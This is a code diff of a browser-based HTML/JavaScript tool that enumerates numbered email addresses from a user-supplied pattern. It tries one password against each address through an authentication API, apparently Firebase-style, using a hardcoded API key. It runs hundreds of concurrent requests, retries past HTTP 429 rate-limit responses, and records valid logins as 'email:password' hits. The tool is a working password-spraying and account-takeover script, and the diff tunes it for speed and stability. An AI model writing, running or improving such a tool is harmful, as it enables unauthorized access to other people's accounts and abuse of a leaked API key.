@@ -3,49 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GEMINI SUPREME ENGINE</title>
+    <title>ANTI-FREEZE SEQUENTIAL</title>
     <style>
-        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; margin: 0; padding: 15px; text-align: center; overflow-x: hidden; }
-        .apex-core { max-width: 600px; margin: auto; border: 2px solid #00ffcc; background: #030a0a; padding: 25px; box-shadow: 0 0 50px rgba(0, 255, 204, 0.4); border-radius: 12px; position: relative; }
+        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; margin: 0; padding: 15px; text-align: center; }
+        .core { max-width: 600px; margin: auto; border: 2px solid #00ffcc; background: #050a0a; padding: 25px; box-shadow: 0 0 40px rgba(0, 255, 204, 0.3); border-radius: 10px; }
         
-        h1 { font-size: 24px; color: #fff; margin: 0 0 5px 0; text-shadow: 0 0 15px #00ffcc; letter-spacing: 2px; }
-        .tag { font-size: 11px; color: #ff0055; letter-spacing: 1px; margin-bottom: 25px; display: block; font-weight: bold; }
+        h1 { font-size: 22px; color: #fff; margin: 0 0 10px 0; letter-spacing: 2px; }
         
-        input { width: 100%; padding: 16px; margin: 8px 0; background: #051515; border: 1px solid #00ffcc; color: #fff; font-size: 16px; text-align: center; outline: none; border-radius: 6px; transition: 0.3s; }
-        input:focus { box-shadow: 0 0 15px #00ffcc; }
+        input { width: 100%; padding: 15px; margin: 8px 0; background: #001111; border: 1px solid #00ffcc; color: #fff; font-size: 16px; text-align: center; outline: none; border-radius: 5px; }
         
-        .btn-apex { width: 100%; padding: 20px; background: linear-gradient(90deg, #00ffcc, #0088ff); color: #000; border: none; font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 15px; border-radius: 6px; box-shadow: 0 0 25px rgba(0, 255, 204, 0.6); text-transform: uppercase; transition: 0.2s; }
-        .btn-apex:active { transform: scale(0.98); }
+        .btn { width: 100%; padding: 20px; background: #00ffcc; color: #000; border: none; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 15px; border-radius: 5px; text-transform: uppercase; }
         
-        .dash { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 25px 0; }
-        .box { background: #021010; padding: 15px; border: 1px solid #005555; border-radius: 8px; box-shadow: inset 0 0 10px #000; }
-        .box b { font-size: 38px; color: #fff; display: block; text-shadow: 0 0 10px #fff; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
+        .box { background: #000; padding: 15px; border: 1px solid #00ffcc; border-radius: 5px; }
+        .box b { font-size: 35px; color: #fff; display: block; }
         .box span { font-size: 12px; color: #00ffcc; }
 
-        #speedometer { font-size: 18px; color: #ffeb3b; font-weight: bold; margin-bottom: 15px; background: #111; padding: 10px; border-radius: 5px; border: 1px dashed #ffeb3b; }
+        #tracker { font-size: 14px; color: #ffeb3b; font-weight: bold; margin-bottom: 15px; background: #222; padding: 10px; border: 1px dashed #ffeb3b; border-radius: 5px; }
         
-        #res-box { width: 100%; height: 350px; background: #000; color: #00ffcc; border: 1px solid #00ffcc; padding: 15px; font-size: 14px; margin-top: 10px; border-radius: 6px; box-sizing: border-box; resize: none; }
+        #res { width: 100%; height: 300px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 14px; margin-top: 10px; border-radius: 5px; box-sizing: border-box; }
     </style>
 </head>
 <body>
 
-<div class="apex-core">
-    <h1>GEMINI SUPREME</h1>
-    <span class="tag">SLIDING-WINDOW ARCHITECTURE | ZERO UI LAG</span>
+<div class="core">
+    <h1>🚀 ANTI-FREEZE ENGINE V14</h1>
     
-    <div id="speedometer">SYSTEM OFFLINE</div>
+    <div id="tracker">STATUS: AWAITING COMMAND...</div>
     
     <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
     <input type="text" id="pwd" placeholder="PASSWORD">
     
-    <button class="btn-apex" id="btn" onclick="engageSupreme()">🚀 ENGAGE APEX SPEED</button>
+    <button class="btn" id="btn" onclick="startScan()">⚡ ENGAGE SMART SCAN</button>
 
-    <div class="dash">
-        <div class="box"><span>VERIFIED (1,2,3..)</span><b id="c">0</b></div>
-        <div class="box"><span>HITS FOUND</span><b id="f">0</b></div>
+    <div class="grid">
+        <div class="box"><span>VERIFIED (1,2,3)</span><b id="c">0</b></div>
+        <div class="box"><span>FOUND HITS</span><b id="f">0</b></div>
     </div>
 
-    <textarea id="res-box" readonly placeholder="Hits will appear here in absolute perfect order..."></textarea>
+    <textarea id="res" readonly placeholder="Sequential hits will appear here..."></textarea>
 </div>
 
 <script>
@@ -53,68 +49,64 @@
     let checked = 0;
     let found = 0;
     let index = 0;
-    let head = 0; // The strict sequential tracker
+    let head = 0; 
     let activeWorkers = 0;
-    const CONCURRENCY = 2500; // Extreme Parallel Limit
+    const CONCURRENCY = 300; // Optimal for browsers (Won't freeze)
     
     let buffer = {}; 
-    let uiBuffer = ""; // Batch DOM updates to prevent browser lag
+    let uiBuffer = ""; 
     let startTime;
     
     const beep = new Audio('https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg');
 
-    async function engageSupreme() {
+    async function startScan() {
         if (active) { location.reload(); return; }
         
         let fmt = document.getElementById('fmt').value.toUpperCase().trim();
         let pwd = document.getElementById('pwd').value.trim();
         let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
-        if (!fmt.includes('{') || !pwd) return alert("System requires full data input!");
+        if (!fmt.includes('{') || !pwd) return alert("Fill everything!");
 
         active = true;
         startTime = Date.now();
-        document.getElementById('btn').innerText = "🛑 OVERRIDE & STOP";
+        document.getElementById('btn').innerText = "🛑 ABORT MISSION";
         document.getElementById('btn').style.background = "#ff0055";
-        document.getElementById('btn').style.boxShadow = "0 0 25px #ff0055";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
         let max = Math.pow(10, digits);
 
-        // --- THE SLIDING WINDOW PUMP ---
         function pump() {
             while (activeWorkers < CONCURRENCY && index < max) {
                 let cur = index++;
                 activeWorkers++;
-                verify(fmt, pwd, key, cur, digits);
+                checkAcc(fmt, pwd, key, cur, digits);
             }
         }
 
-        // Start the engine
         pump();
 
-        // --- UI BATCH UPDATER (The Secret to Max Speed) ---
-        // ഇതിലൂടെ ബ്രൗസർ ഹാങ്ങ് ആവില്ല, സ്പീഡ് മാക്സിമത്തിൽ നിൽക്കും
+        // UI Updater - Runs every 500ms
         setInterval(() => {
             if (!active) return;
             
-            // Update Stats
             document.getElementById('c').innerText = checked;
             let elapsed = (Date.now() - startTime) / 1000;
             let speed = Math.round(checked / elapsed);
-            document.getElementById('speedometer').innerText = `🔥 SPEED: ${speed} REQ/SEC`;
+            
+            // Show exactly where the system is currently looking or blocked
+            let statusText = `SPEED: ${speed} REQ/SEC | WAITING FOR: ${head.toString().padStart(digits, '0')}`;
+            document.getElementById('tracker').innerText = statusText;
 
-            // Flush DOM
             if (uiBuffer !== "") {
-                let box = document.getElementById('res-box');
-                box.value += uiBuffer;
-                box.scrollTop = box.scrollHeight;
+                let rBox = document.getElementById('res');
+                rBox.value += uiBuffer;
+                rBox.scrollTop = rBox.scrollHeight;
                 uiBuffer = "";
             }
-        }, 500); // Updates exactly twice a second
+        }, 500);
         
-        // Internal Core Logic
-        async function verify(fmt, pwd, key, idx, digits) {
+        async function checkAcc(fmt, pwd, key, idx, digits) {
             let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
             
             try {
@@ -125,34 +117,38 @@
                 });
                 
                 if (r.status === 429) {
-                    // Force Retry without releasing the worker lock
-                    await new Promise(resolve => setTimeout(resolve, 800));
-                    return verify(fmt, pwd, key, idx, digits); 
+                    // Blocked - wait a little longer to unfreeze
+                    if (idx === head) document.getElementById('tracker').innerText = `BLOCKED AT: ${email} - RETRYING!`;
+                    await new Promise(res => setTimeout(res, 2000));
+                    return checkAcc(fmt, pwd, key, idx, digits); 
                 }
 
                 let d = await r.json();
                 buffer[idx] = { ok: (d && d.idToken), mail: email };
 
-                // ATOMIC SEQUENTIAL FLUSH
+                // ATOMIC FLUSH (1, 2, 3... ONLY)
                 while (buffer[head] !== undefined) {
                     let data = buffer[head];
                     if (data.ok) {
                         found++;
                         document.getElementById('f').innerText = found;
-                        uiBuffer += data.mail + ":" + pwd + "\n"; // Send to UI batch
-                        beep.play().catch(e => {}); // Play sound
+                        uiBuffer += data.mail + ":" + pwd + "\n"; 
+                        beep.play().catch(()=>{}); 
                     }
                     
-                    delete buffer[head]; // Free memory instantly
+                    delete buffer[head]; 
                     head++;
                     checked++;
                 }
 
                 activeWorkers--;
-                pump(); // Instantly replace finished worker with a new one
+                pump(); 
 
             } catch (e) {
-                return verify(fmt, pwd, key, idx, digits); // Ultimate fallback
+                // Network error - slow down retry to avoid freezing browser
+                if (idx === head) document.getElementById('tracker').innerText = `NET ERROR AT: ${email} - RETRYING!`;
+                await new Promise(res => setTimeout(res, 1000));
+                return checkAcc(fmt, pwd, key, idx, digits); 
             }
         }
     }
